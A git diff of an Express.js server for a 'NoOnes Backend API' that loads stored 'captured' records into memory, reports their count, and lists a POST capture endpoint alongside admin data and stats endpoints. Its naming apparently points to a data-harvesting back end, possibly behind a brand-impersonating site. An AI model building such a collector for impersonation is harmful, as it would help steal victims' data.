@@ -9,12 +9,12 @@ const adminRoutes = require('./routes/admin');
 
 const app = express();
 
-// Middleware
+// Middleware - FIX CORS for Vercel
 app.use(cors({
   origin: [
-    'http://localhost:3000',  // Local development
-    'https://noones.vercel.app', // Your Vercel frontend
-    'https://noones-*.vercel.app' // All Vercel preview deployments
+    'http://localhost:3000',
+    'https://noones.vercel.app',
+    'https://noones-*.vercel.app'
   ],
   credentials: true,
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
@@ -39,16 +39,29 @@ if (!fs.existsSync(dataFile)) {
   fs.writeFileSync(dataFile, JSON.stringify([], null, 2));
 }
 
+// Initialize global storage
+global.capturedData = [];
+
+// Load existing data from file
+try {
+  const existingData = fs.readFileSync(dataFile, 'utf8');
+  global.capturedData = JSON.parse(existingData);
+  console.log(`📂 Loaded ${global.capturedData.length} existing records`);
+} catch (error) {
+  console.log('No existing data file, starting fresh');
+}
+
 // Routes
 app.use('/api/capture', captureRoutes);
 app.use('/api/admin', adminRoutes);
 
-// Health check endpoint (CRITICAL for Render)
+// Health check endpoint
 app.get('/health', (req, res) => {
   res.status(200).json({ 
     status: 'OK', 
     timestamp: new Date().toISOString(),
-    service: 'NoOnes Backend API'
+    service: 'NoOnes Backend API',
+    records: global.capturedData.length
   });
 });
 
@@ -58,9 +71,10 @@ app.get('/', (req, res) => {
     message: 'NoOnes Backend API',
     version: '1.0.0',
     endpoints: {
-      capture: '/api/capture',
-      admin: '/api/admin',
-      health: '/health'
+      capture: 'POST /api/capture',
+      admin_data: 'GET /api/admin/data',
+      admin_stats: 'GET /api/admin/stats',
+      health: 'GET /health'
     }
   });
 });
@@ -69,5 +83,6 @@ const PORT = process.env.PORT || 5000;
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`✅ NoOnes Backend running on port ${PORT}`);
   console.log(`📁 Data directory: ${dataDir}`);
-  console.log(`🌐 CORS enabled for frontend deployment`);
+  console.log(`📊 Current records: ${global.capturedData.length}`);
+  console.log(`🌐 CORS enabled for Vercel deployments`);
 });
